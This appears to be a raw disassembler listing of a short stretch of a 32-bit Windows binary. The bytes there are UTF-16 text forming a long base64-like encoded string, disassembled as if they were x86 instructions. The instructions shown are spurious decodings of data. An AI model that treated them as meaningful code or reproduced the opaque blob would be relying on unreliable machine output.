  40b909:	56                   	push   %esi
  40b90a:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40b90e:	00 6a 00             	add    %ch,0x0(%edx)
  40b911:	63 00                	arpl   %eax,(%eax)
  40b913:	76 00                	jbe    0x40b915
  40b915:	6b 00 63             	imul   $0x63,(%eax),%eax
  40b918:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40b91c:	00 55 00             	add    %dl,0x0(%ebp)
  40b91f:	69 00 43 00 6c 00    	imul   $0x6c0043,(%eax),%eax
  40b925:	37                   	aaa
  40b926:	00 4b 00             	add    %cl,0x0(%ebx)
  40b929:	6a 00                	push   $0x0
  40b92b:	38 00                	cmp    %al,(%eax)
  40b92d:	50                   	push   %eax
  40b92e:	00 66 00             	add    %ah,0x0(%esi)
  40b931:	70 00                	jo     0x40b933
  40b933:	49                   	dec    %ecx
  40b934:	00 39                	add    %bh,(%ecx)
  40b936:	00 48 00             	add    %cl,0x0(%eax)
  40b939:	30 00                	xor    %al,(%eax)
  40b93b:	69 00 70 00 4b 00    	imul   $0x4b0070,(%eax),%eax
  40b941:	49                   	dec    %ecx
  40b942:	00 69 00             	add    %ch,0x0(%ecx)
  40b945:	76 00                	jbe    0x40b947
  40b947:	43                   	inc    %ebx
  40b948:	00 59 00             	add    %bl,0x0(%ecx)
  40b94b:	46                   	inc    %esi
  40b94c:	00 35 00 54 00 56    	add    %dh,0x56005400
  40b952:	00 71 00             	add    %dh,0x0(%ecx)
  40b955:	57                   	push   %edi
  40b956:	00 36                	add    %dh,(%esi)
  40b958:	00 57 00             	add    %dl,0x0(%edi)
  40b95b:	54                   	push   %esp
  40b95c:	00 47 00             	add    %al,0x0(%edi)
  40b95f:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40b963:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b967:	58                   	pop    %eax
  40b968:	00 75 00             	add    %dh,0x0(%ebp)
  40b96b:	2b 00                	sub    (%eax),%eax
  40b96d:	42                   	inc    %edx
  40b96e:	00 77 00             	add    %dh,0x0(%edi)
  40b971:	74 00                	je     0x40b973
  40b973:	7a 00                	jp     0x40b975
  40b975:	76 00                	jbe    0x40b977
  40b977:	54                   	push   %esp
  40b978:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40b97c:	00 4e 00             	add    %cl,0x0(%esi)
  40b97f:	32 00                	xor    (%eax),%al
  40b981:	6d                   	insl   (%dx),%es:(%edi)
  40b982:	00 47 00             	add    %al,0x0(%edi)
  40b985:	69 00 71 00 57 00    	imul   $0x570071,(%eax),%eax
  40b98b:	51                   	push   %ecx
  40b98c:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b990:	00 78 00             	add    %bh,0x0(%eax)
  40b993:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40b997:	72 00                	jb     0x40b999
  40b999:	76 00                	jbe    0x40b99b
  40b99b:	46                   	inc    %esi
  40b99c:	00 49 00             	add    %cl,0x0(%ecx)
  40b99f:	70 00                	jo     0x40b9a1
  40b9a1:	30 00                	xor    %al,(%eax)
  40b9a3:	72 00                	jb     0x40b9a5
  40b9a5:	4b                   	dec    %ebx
  40b9a6:	00 70 00             	add    %dh,0x0(%eax)
  40b9a9:	61                   	popa
  40b9aa:	00 5a 00             	add    %bl,0x0(%edx)
  40b9ad:	2f                   	das
  40b9ae:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40b9b2:	00 57 00             	add    %dl,0x0(%edi)
  40b9b5:	6c                   	insb   (%dx),%es:(%edi)
  40b9b6:	00 70 00             	add    %dh,0x0(%eax)
  40b9b9:	77 00                	ja     0x40b9bb
  40b9bb:	71 00                	jno    0x40b9bd
  40b9bd:	4b                   	dec    %ebx
  40b9be:	00 4f 00             	add    %cl,0x0(%edi)
  40b9c1:	77 00                	ja     0x40b9c3
  40b9c3:	46                   	inc    %esi
  40b9c4:	00 38                	add    %bh,(%eax)
  40b9c6:	00 47 00             	add    %al,0x0(%edi)
  40b9c9:	44                   	inc    %esp
  40b9ca:	00 48 00             	add    %cl,0x0(%eax)
  40b9cd:	4a                   	dec    %edx
  40b9ce:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40b9d2:	00 31                	add    %dh,(%ecx)
  40b9d4:	00 46 00             	add    %al,0x0(%esi)
  40b9d7:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40b9db:	62 00                	bound  %eax,(%eax)
  40b9dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9de:	00 75 00             	add    %dh,0x0(%ebp)
  40b9e1:	4d                   	dec    %ebp
  40b9e2:	00 50 00             	add    %dl,0x0(%eax)
  40b9e5:	68 00 7a 00 54       	push   $0x54007a00
  40b9ea:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40b9ee:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40b9f2:	00 53 00             	add    %dl,0x0(%ebx)
  40b9f5:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b9f9:	79 00                	jns    0x40b9fb
  40b9fb:	77 00                	ja     0x40b9fd
  40b9fd:	56                   	push   %esi
  40b9fe:	00 38                	add    %bh,(%eax)
  40ba00:	00 46 00             	add    %al,0x0(%esi)
  40ba03:	79 00                	jns    0x40ba05
  40ba05:	56                   	push   %esi
  40ba06:	00 36                	add    %dh,(%esi)
  40ba08:	00 46 00             	add    %al,0x0(%esi)
  40ba0b:	5a                   	pop    %edx
  40ba0c:	00 32                	add    %dh,(%edx)
  40ba0e:	00 63 00             	add    %ah,0x0(%ebx)
  40ba11:	67 00 6e 00          	add    %ch,0x0(%bp)
  40ba15:	48                   	dec    %eax
  40ba16:	00 58 00             	add    %bl,0x0(%eax)
  40ba19:	56                   	push   %esi
  40ba1a:	00 4f 00             	add    %cl,0x0(%edi)
  40ba1d:	38 00                	cmp    %al,(%eax)
  40ba1f:	43                   	inc    %ebx
  40ba20:	00 79 00             	add    %bh,0x0(%ecx)
  40ba23:	38 00                	cmp    %al,(%eax)
  40ba25:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40ba29:	46                   	inc    %esi
  40ba2a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba2d:	4b                   	dec    %ebx
  40ba2e:	00 31                	add    %dh,(%ecx)
  40ba30:	00 4f 00             	add    %cl,0x0(%edi)
  40ba33:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40ba37:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba38:	00 30                	add    %dh,(%eax)
  40ba3a:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40ba3e:	00 66 00             	add    %ah,0x0(%esi)
  40ba41:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40ba45:	4e                   	dec    %esi
  40ba46:	00 77 00             	add    %dh,0x0(%edi)
  40ba49:	50                   	push   %eax
  40ba4a:	00 78 00             	add    %bh,0x0(%eax)
  40ba4d:	52                   	push   %edx
  40ba4e:	00 52 00             	add    %dl,0x0(%edx)
  40ba51:	4b                   	dec    %ebx
  40ba52:	00 53 00             	add    %dl,0x0(%ebx)
  40ba55:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40ba58:	00 67 00             	add    %ah,0x0(%edi)
  40ba5b:	77 00                	ja     0x40ba5d
  40ba5d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40ba60:	00 68 00             	add    %ch,0x0(%eax)
  40ba63:	58                   	pop    %eax
  40ba64:	00 70 00             	add    %dh,0x0(%eax)
  40ba67:	6a 00                	push   $0x0
  40ba69:	38 00                	cmp    %al,(%eax)
  40ba6b:	4b                   	dec    %ebx
  40ba6c:	00 51 00             	add    %dl,0x0(%ecx)
  40ba6f:	30 00                	xor    %al,(%eax)
  40ba71:	54                   	push   %esp
  40ba72:	00 30                	add    %dh,(%eax)
  40ba74:	00 43 00             	add    %al,0x0(%ebx)
  40ba77:	50                   	push   %eax
  40ba78:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba7b:	39 00                	cmp    %eax,(%eax)
  40ba7d:	6a 00                	push   $0x0
  40ba7f:	77 00                	ja     0x40ba81
  40ba81:	52                   	push   %edx
  40ba82:	00 2b                	add    %ch,(%ebx)
  40ba84:	00 6a 00             	add    %ch,0x0(%edx)
  40ba87:	53                   	push   %ebx
  40ba88:	00 77 00             	add    %dh,0x0(%edi)
  40ba8b:	52                   	push   %edx
  40ba8c:	00 68 00             	add    %ch,0x0(%eax)
  40ba8f:	6c                   	insb   (%dx),%es:(%edi)
  40ba90:	00 53 00             	add    %dl,0x0(%ebx)
  40ba93:	34 00                	xor    $0x0,%al
  40ba95:	73 00                	jae    0x40ba97
  40ba97:	6d                   	insl   (%dx),%es:(%edi)
  40ba98:	00 76 00             	add    %dh,0x0(%esi)
  40ba9b:	49                   	dec    %ecx
  40ba9c:	00 70 00             	add    %dh,0x0(%eax)
  40ba9f:	2b 00                	sub    (%eax),%eax
  40baa1:	2f                   	das
  40baa2:	00 6d 00             	add    %ch,0x0(%ebp)
  40baa5:	7a 00                	jp     0x40baa7
  40baa7:	78 00                	js     0x40baa9
  40baa9:	47                   	inc    %edi
  40baaa:	00 6e 00             	add    %ch,0x0(%esi)
  40baad:	6b 00 34             	imul   $0x34,(%eax),%eax
  40bab0:	00 69 00             	add    %ch,0x0(%ecx)
  40bab3:	53                   	push   %ebx
  40bab4:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  40bab8:	00 55 00             	add    %dl,0x0(%ebp)
  40babb:	31 00                	xor    %eax,(%eax)
  40babd:	7a 00                	jp     0x40babf
  40babf:	72 00                	jb     0x40bac1
  40bac1:	38 00                	cmp    %al,(%eax)
  40bac3:	70 00                	jo     0x40bac5
  40bac5:	55                   	push   %ebp
  40bac6:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40baca:	00 50 00             	add    %dl,0x0(%eax)
  40bacd:	6f                   	outsl  %ds:(%esi),(%dx)
  40bace:	00 31                	add    %dh,(%ecx)
  40bad0:	00 4a 00             	add    %cl,0x0(%edx)
  40bad3:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40bad7:	76 00                	jbe    0x40bad9
  40bad9:	4c                   	dec    %esp
  40bada:	00 48 00             	add    %cl,0x0(%eax)
  40badd:	30 00                	xor    %al,(%eax)
  40badf:	71 00                	jno    0x40bae1
  40bae1:	72 00                	jb     0x40bae3
  40bae3:	66 00 44 00 6c       	data16 add %al,0x6c(%eax,%eax,1)
  40bae8:	00 43 00             	add    %al,0x0(%ebx)
  40baeb:	6e                   	outsb  %ds:(%esi),(%dx)
  40baec:	00 53 00             	add    %dl,0x0(%ebx)
  40baef:	33 00                	xor    (%eax),%eax
  40baf1:	4a                   	dec    %edx
  40baf2:	00 6f 00             	add    %ch,0x0(%edi)
  40baf5:	47                   	inc    %edi
  40baf6:	00 67 00             	add    %ah,0x0(%edi)
  40baf9:	59                   	pop    %ecx
  40bafa:	00 50 00             	add    %dl,0x0(%eax)
  40bafd:	54                   	push   %esp
  40bafe:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40bb02:	00 65 00             	add    %ah,0x0(%ebp)
  40bb05:	78 00                	js     0x40bb07
  40bb07:	48                   	dec    %eax
  40bb08:	00 62 00             	add    %ah,0x0(%edx)
  40bb0b:	37                   	aaa
  40bb0c:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40bb10:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb13:	4e                   	dec    %esi
  40bb14:	00 6a 00             	add    %ch,0x0(%edx)
  40bb17:	78 00                	js     0x40bb19
  40bb19:	63 00                	arpl   %eax,(%eax)
  40bb1b:	47                   	inc    %edi
  40bb1c:	00 33                	add    %dh,(%ebx)
  40bb1e:	00 2f                	add    %ch,(%edi)
  40bb20:	00 77 00             	add    %dh,0x0(%edi)
  40bb23:	6b 00 38             	imul   $0x38,(%eax),%eax
  40bb26:	00 67 00             	add    %ah,0x0(%edi)
  40bb29:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb2a:	00 38                	add    %bh,(%eax)
  40bb2c:	00 53 00             	add    %dl,0x0(%ebx)
  40bb2f:	59                   	pop    %ecx
  40bb30:	00 55 00             	add    %dl,0x0(%ebp)
  40bb33:	76 00                	jbe    0x40bb35
  40bb35:	45                   	inc    %ebp
  40bb36:	00 50 00             	add    %dl,0x0(%eax)
  40bb39:	54                   	push   %esp
  40bb3a:	00 37                	add    %dh,(%edi)
  40bb3c:	00 62 00             	add    %ah,0x0(%edx)
  40bb3f:	2b 00                	sub    (%eax),%eax
  40bb41:	50                   	push   %eax
  40bb42:	00 53 00             	add    %dl,0x0(%ebx)
  40bb45:	74 00                	je     0x40bb47
  40bb47:	55                   	push   %ebp
  40bb48:	00 68 00             	add    %ch,0x0(%eax)
  40bb4b:	45                   	inc    %ebp
  40bb4c:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40bb50:	00 56 00             	add    %dl,0x0(%esi)
  40bb53:	52                   	push   %edx
  40bb54:	00 75 00             	add    %dh,0x0(%ebp)
  40bb57:	6c                   	insb   (%dx),%es:(%edi)
  40bb58:	00 73 00             	add    %dh,0x0(%ebx)
  40bb5b:	41                   	inc    %ecx
  40bb5c:	00 55 00             	add    %dl,0x0(%ebp)
  40bb5f:	6c                   	insb   (%dx),%es:(%edi)
  40bb60:	00 62 00             	add    %ah,0x0(%edx)
  40bb63:	62 00                	bound  %eax,(%eax)
  40bb65:	52                   	push   %edx
  40bb66:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40bb6a:	00 79 00             	add    %bh,0x0(%ecx)
  40bb6d:	38 00                	cmp    %al,(%eax)
  40bb6f:	51                   	push   %ecx
  40bb70:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40bb74:	00 39                	add    %bh,(%ecx)
  40bb76:	00 67 00             	add    %ah,0x0(%edi)
  40bb79:	47                   	inc    %edi
  40bb7a:	00 58 00             	add    %bl,0x0(%eax)
  40bb7d:	47                   	inc    %edi
  40bb7e:	00 79 00             	add    %bh,0x0(%ecx)
  40bb81:	55                   	push   %ebp
  40bb82:	00 6a 00             	add    %ch,0x0(%edx)
  40bb85:	34 00                	xor    $0x0,%al
  40bb87:	79 00                	jns    0x40bb89
  40bb89:	63 00                	arpl   %eax,(%eax)
  40bb8b:	43                   	inc    %ebx
  40bb8c:	00 7a 00             	add    %bh,0x0(%edx)
  40bb8f:	6c                   	insb   (%dx),%es:(%edi)
  40bb90:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40bb94:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40bb98:	00 45 00             	add    %al,0x0(%ebp)
  40bb9b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb9c:	00 2f                	add    %ch,(%edi)
  40bb9e:	00 79 00             	add    %bh,0x0(%ecx)
  40bba1:	47                   	inc    %edi
  40bba2:	00 55 00             	add    %dl,0x0(%ebp)
  40bba5:	2b 00                	sub    (%eax),%eax
  40bba7:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40bbaa:	00 38                	add    %bh,(%eax)
  40bbac:	00 35 00 4b 00 34    	add    %dh,0x34004b00
  40bbb2:	00 76 00             	add    %dh,0x0(%esi)
  40bbb5:	56                   	push   %esi
  40bbb6:	00 46 00             	add    %al,0x0(%esi)
  40bbb9:	51                   	push   %ecx
  40bbba:	00 6b 00             	add    %ch,0x0(%ebx)
  40bbbd:	73 00                	jae    0x40bbbf
  40bbbf:	74 00                	je     0x40bbc1
  40bbc1:	33 00                	xor    (%eax),%eax
  40bbc3:	48                   	dec    %eax
  40bbc4:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40bbc8:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40bbcc:	00 48 00             	add    %cl,0x0(%eax)
  40bbcf:	59                   	pop    %ecx
  40bbd0:	00 65 00             	add    %ah,0x0(%ebp)
  40bbd3:	4e                   	dec    %esi
  40bbd4:	00 56 00             	add    %dl,0x0(%esi)
  40bbd7:	57                   	push   %edi
  40bbd8:	00 62 00             	add    %ah,0x0(%edx)
  40bbdb:	35 00 6a 00 37       	xor    $0x37006a00,%eax
  40bbe0:	00 7a 00             	add    %bh,0x0(%edx)
  40bbe3:	70 00                	jo     0x40bbe5
  40bbe5:	71 00                	jno    0x40bbe7
  40bbe7:	5a                   	pop    %edx
  40bbe8:	00 58 00             	add    %bl,0x0(%eax)
  40bbeb:	70 00                	jo     0x40bbed
  40bbed:	39 00                	cmp    %eax,(%eax)
  40bbef:	56                   	push   %esi
  40bbf0:	00 7a 00             	add    %bh,0x0(%edx)
  40bbf3:	43                   	inc    %ebx
  40bbf4:	00 32                	add    %dh,(%edx)
  40bbf6:	00 69 00             	add    %ch,0x0(%ecx)
  40bbf9:	72 00                	jb     0x40bbfb
  40bbfb:	6a 00                	push   $0x0
  40bbfd:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40bc01:	6c                   	insb   (%dx),%es:(%edi)
  40bc02:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40bc06:	00 41 00             	add    %al,0x0(%ecx)
  40bc09:	53                   	push   %ebx
  40bc0a:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40bc0e:	00 31                	add    %dh,(%ecx)
  40bc10:	00 4b 00             	add    %cl,0x0(%ebx)
  40bc13:	44                   	inc    %esp
  40bc14:	00 36                	add    %dh,(%esi)
  40bc16:	00 68 00             	add    %ch,0x0(%eax)
  40bc19:	69 00 45 00 68 00    	imul   $0x680045,(%eax),%eax
  40bc1f:	52                   	push   %edx
  40bc20:	00 46 00             	add    %al,0x0(%esi)
  40bc23:	63 00                	arpl   %eax,(%eax)
  40bc25:	6d                   	insl   (%dx),%es:(%edi)
  40bc26:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40bc2a:	00 73 00             	add    %dh,0x0(%ebx)
  40bc2d:	49                   	dec    %ecx
  40bc2e:	00 6e 00             	add    %ch,0x0(%esi)
  40bc31:	32 00                	xor    (%eax),%al
  40bc33:	41                   	inc    %ecx
  40bc34:	00 35 00 2b 00 39    	add    %dh,0x39002b00
  40bc3a:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40bc3e:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc41:	70 00                	jo     0x40bc43
  40bc43:	7a 00                	jp     0x40bc45
  40bc45:	2b 00                	sub    (%eax),%eax
  40bc47:	44                   	inc    %esp
  40bc48:	00 59 00             	add    %bl,0x0(%ecx)
  40bc4b:	47                   	inc    %edi
  40bc4c:	00 58 00             	add    %bl,0x0(%eax)
  40bc4f:	4d                   	dec    %ebp
  40bc50:	00 4e 00             	add    %cl,0x0(%esi)
  40bc53:	33 00                	xor    (%eax),%eax
  40bc55:	78 00                	js     0x40bc57
  40bc57:	74 00                	je     0x40bc59
  40bc59:	48                   	dec    %eax
  40bc5a:	00 6f 00             	add    %ch,0x0(%edi)
  40bc5d:	6d                   	insl   (%dx),%es:(%edi)
  40bc5e:	00 63 00             	add    %ah,0x0(%ebx)
  40bc61:	4c                   	dec    %esp
  40bc62:	00 2f                	add    %ch,(%edi)
  40bc64:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40bc68:	00 62 00             	add    %ah,0x0(%edx)
  40bc6b:	66 00 4c 00 57       	data16 add %cl,0x57(%eax,%eax,1)
  40bc70:	00 69 00             	add    %ch,0x0(%ecx)
  40bc73:	68 00 39 00 72       	push   $0x72003900
  40bc78:	00 39                	add    %bh,(%ecx)
  40bc7a:	00 71 00             	add    %dh,0x0(%ecx)
  40bc7d:	79 00                	jns    0x40bc7f
  40bc7f:	68 00 2f 00 74       	push   $0x74002f00
  40bc84:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc87:	46                   	inc    %esi
  40bc88:	00 6e 00             	add    %ch,0x0(%esi)
  40bc8b:	71 00                	jno    0x40bc8d
  40bc8d:	4a                   	dec    %edx
  40bc8e:	00 62 00             	add    %ah,0x0(%edx)
  40bc91:	65 00 38             	add    %bh,%gs:(%eax)
  40bc94:	00 68 00             	add    %ch,0x0(%eax)
  40bc97:	66 00 64 00 70       	data16 add %ah,0x70(%eax,%eax,1)
  40bc9c:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40bca0:	00 41 00             	add    %al,0x0(%ecx)
  40bca3:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40bca7:	5a                   	pop    %edx
  40bca8:	00 50 00             	add    %dl,0x0(%eax)
  40bcab:	6d                   	insl   (%dx),%es:(%edi)
  40bcac:	00 4a 00             	add    %cl,0x0(%edx)
  40bcaf:	46                   	inc    %esi
  40bcb0:	00 77 00             	add    %dh,0x0(%edi)
  40bcb3:	4f                   	dec    %edi
  40bcb4:	00 4f 00             	add    %cl,0x0(%edi)
  40bcb7:	35 00 6f 00 65       	xor    $0x65006f00,%eax
  40bcbc:	00 72 00             	add    %dh,0x0(%edx)
  40bcbf:	59                   	pop    %ecx
  40bcc0:	00 2f                	add    %ch,(%edi)
  40bcc2:	00 4b 00             	add    %cl,0x0(%ebx)
  40bcc5:	57                   	push   %edi
  40bcc6:	00 56 00             	add    %dl,0x0(%esi)
  40bcc9:	32 00                	xor    (%eax),%al
  40bccb:	31 00                	xor    %eax,(%eax)
  40bccd:	59                   	pop    %ecx
  40bcce:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40bcd2:	00 7a 00             	add    %bh,0x0(%edx)
  40bcd5:	65 00 54 00 56       	add    %dl,%gs:0x56(%eax,%eax,1)
  40bcda:	00 7a 00             	add    %bh,0x0(%edx)
  40bcdd:	4a                   	dec    %edx
  40bcde:	00 35 00 4d 00 79    	add    %dh,0x79004d00
  40bce4:	00 6b 00             	add    %ch,0x0(%ebx)
  40bce7:	4f                   	dec    %edi
  40bce8:	00 45 00             	add    %al,0x0(%ebp)
  40bceb:	68 00 45 00 62       	push   $0x62004500
  40bcf0:	00 35 00 2f 00 70    	add    %dh,0x70002f00
  40bcf6:	00 66 00             	add    %ah,0x0(%esi)
  40bcf9:	44                   	inc    %esp
  40bcfa:	00 38                	add    %bh,(%eax)
  40bcfc:	00 47 00             	add    %al,0x0(%edi)
  40bcff:	74 00                	je     0x40bd01
  40bd01:	72 00                	jb     0x40bd03
  40bd03:	52                   	push   %edx
  40bd04:	00 33                	add    %dh,(%ebx)
  40bd06:	00 49 00             	add    %cl,0x0(%ecx)
  40bd09:	42                   	inc    %edx
  40bd0a:	00 42 00             	add    %al,0x0(%edx)
  40bd0d:	4a                   	dec    %edx
  40bd0e:	00 79 00             	add    %bh,0x0(%ecx)
  40bd11:	65 00 35 00 42 00 51 	add    %dh,%gs:0x51004200
  40bd18:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bd1b:	34 00                	xor    $0x0,%al
  40bd1d:	58                   	pop    %eax
  40bd1e:	00 62 00             	add    %ah,0x0(%edx)
  40bd21:	50                   	push   %eax
  40bd22:	00 71 00             	add    %dh,0x0(%ecx)
  40bd25:	41                   	inc    %ecx
  40bd26:	00 36                	add    %dh,(%esi)
  40bd28:	00 77 00             	add    %dh,0x0(%edi)
  40bd2b:	57                   	push   %edi
  40bd2c:	00 32                	add    %dh,(%edx)
  40bd2e:	00 41 00             	add    %al,0x0(%ecx)
  40bd31:	68 00 39 00 68       	push   $0x68003900
  40bd36:	00 67 00             	add    %ah,0x0(%edi)
  40bd39:	7a 00                	jp     0x40bd3b
  40bd3b:	35 00 50 00 44       	xor    $0x44005000,%eax
  40bd40:	00 70 00             	add    %dh,0x0(%eax)
  40bd43:	61                   	popa
  40bd44:	00 59 00             	add    %bl,0x0(%ecx)
  40bd47:	43                   	inc    %ebx
  40bd48:	00 7a 00             	add    %bh,0x0(%edx)
  40bd4b:	75 00                	jne    0x40bd4d
  40bd4d:	4b                   	dec    %ebx
  40bd4e:	00 35 00 73 00 54    	add    %dh,0x54007300
  40bd54:	00 7a 00             	add    %bh,0x0(%edx)
  40bd57:	69 00 59 00 64 00    	imul   $0x640059,(%eax),%eax
  40bd5d:	53                   	push   %ebx
  40bd5e:	00 67 00             	add    %ah,0x0(%edi)
  40bd61:	6d                   	insl   (%dx),%es:(%edi)
  40bd62:	00 6b 00             	add    %ch,0x0(%ebx)
  40bd65:	67 00 6e 00          	add    %ch,0x0(%bp)
  40bd69:	4e                   	dec    %esi
  40bd6a:	00 4a 00             	add    %cl,0x0(%edx)
  40bd6d:	6c                   	insb   (%dx),%es:(%edi)
  40bd6e:	00 75 00             	add    %dh,0x0(%ebp)
  40bd71:	79 00                	jns    0x40bd73
  40bd73:	51                   	push   %ecx
  40bd74:	00 52 00             	add    %dl,0x0(%edx)
  40bd77:	52                   	push   %edx
  40bd78:	00 71 00             	add    %dh,0x0(%ecx)
  40bd7b:	77 00                	ja     0x40bd7d
  40bd7d:	51                   	push   %ecx
  40bd7e:	00 6f 00             	add    %ch,0x0(%edi)
  40bd81:	32 00                	xor    (%eax),%al
  40bd83:	44                   	inc    %esp
  40bd84:	00 70 00             	add    %dh,0x0(%eax)
  40bd87:	6d                   	insl   (%dx),%es:(%edi)
  40bd88:	00 2b                	add    %ch,(%ebx)
  40bd8a:	00 71 00             	add    %dh,0x0(%ecx)
  40bd8d:	37                   	aaa
  40bd8e:	00 49 00             	add    %cl,0x0(%ecx)
  40bd91:	59                   	pop    %ecx
  40bd92:	00 31                	add    %dh,(%ecx)
  40bd94:	00 32                	add    %dh,(%edx)
  40bd96:	00 50 00             	add    %dl,0x0(%eax)
  40bd99:	55                   	push   %ebp
  40bd9a:	00 59 00             	add    %bl,0x0(%ecx)
  40bd9d:	6b 00 72             	imul   $0x72,(%eax),%eax
  40bda0:	00 53 00             	add    %dl,0x0(%ebx)
  40bda3:	67 00 39             	add    %bh,(%bx,%di)
  40bda6:	00 68 00             	add    %ch,0x0(%eax)
  40bda9:	4a                   	dec    %edx
  40bdaa:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40bdae:	00 6b 00             	add    %ch,0x0(%ebx)
  40bdb1:	57                   	push   %edi
  40bdb2:	00 65 00             	add    %ah,0x0(%ebp)
  40bdb5:	52                   	push   %edx
  40bdb6:	00 43 00             	add    %al,0x0(%ebx)
  40bdb9:	31 00                	xor    %eax,(%eax)
  40bdbb:	2f                   	das
  40bdbc:	00 5a 00             	add    %bl,0x0(%edx)
  40bdbf:	46                   	inc    %esi
  40bdc0:	00 30                	add    %dh,(%eax)
  40bdc2:	00 57 00             	add    %dl,0x0(%edi)
  40bdc5:	52                   	push   %edx
  40bdc6:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40bdca:	00 57 00             	add    %dl,0x0(%edi)
  40bdcd:	56                   	push   %esi
  40bdce:	00 46 00             	add    %al,0x0(%esi)
  40bdd1:	75 00                	jne    0x40bdd3
  40bdd3:	52                   	push   %edx
  40bdd4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bdd7:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40bdda:	00 38                	add    %bh,(%eax)
  40bddc:	00 2f                	add    %ch,(%edi)
  40bdde:	00 62 00             	add    %ah,0x0(%edx)
  40bde1:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40bde5:	74 00                	je     0x40bde7
  40bde7:	61                   	popa
  40bde8:	00 55 00             	add    %dl,0x0(%ebp)
  40bdeb:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40bdee:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40bdf2:	00 37                	add    %dh,(%edi)
  40bdf4:	00 36                	add    %dh,(%esi)
  40bdf6:	00 4e 00             	add    %cl,0x0(%esi)
  40bdf9:	35 00 38 00 78       	xor    $0x78003800,%eax
  40bdfe:	00 71 00             	add    %dh,0x0(%ecx)
  40be01:	39 00                	cmp    %eax,(%eax)
  40be03:	73 00                	jae    0x40be05
  40be05:	64 00 2f             	add    %ch,%fs:(%edi)
  40be08:	00 4d 00             	add    %cl,0x0(%ebp)
  40be0b:	61                   	popa
  40be0c:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40be10:	00 6d 00             	add    %ch,0x0(%ebp)
  40be13:	32 00                	xor    (%eax),%al
  40be15:	33 00                	xor    (%eax),%eax
  40be17:	33 00                	xor    (%eax),%eax
  40be19:	37                   	aaa
  40be1a:	00 51 00             	add    %dl,0x0(%ecx)
  40be1d:	5a                   	pop    %edx
  40be1e:	00 43 00             	add    %al,0x0(%ebx)
  40be21:	61                   	popa
  40be22:	00 38                	add    %bh,(%eax)
  40be24:	00 78 00             	add    %bh,0x0(%eax)
  40be27:	63 00                	arpl   %eax,(%eax)
  40be29:	50                   	push   %eax
  40be2a:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40be2e:	00 51 00             	add    %dl,0x0(%ecx)
  40be31:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40be36:	80 b1 77 00 58 00 50 	xorb   $0x50,0x580077(%ecx)
  40be3d:	00 4f 00             	add    %cl,0x0(%edi)
  40be40:	65 00 4c 00 54       	add    %cl,%gs:0x54(%eax,%eax,1)
  40be45:	00 62 00             	add    %ah,0x0(%edx)
  40be48:	50                   	push   %eax
  40be49:	00 2f                	add    %ch,(%edi)
  40be4b:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40be4f:	00 4e 00             	add    %cl,0x0(%esi)
  40be52:	43                   	inc    %ebx
  40be53:	00 50 00             	add    %dl,0x0(%eax)
  40be56:	35 00 47 00 4d       	xor    $0x4d004700,%eax
  40be5b:	00 35 00 35 00 73    	add    %dh,0x73003500
  40be61:	00 41 00             	add    %al,0x0(%ecx)
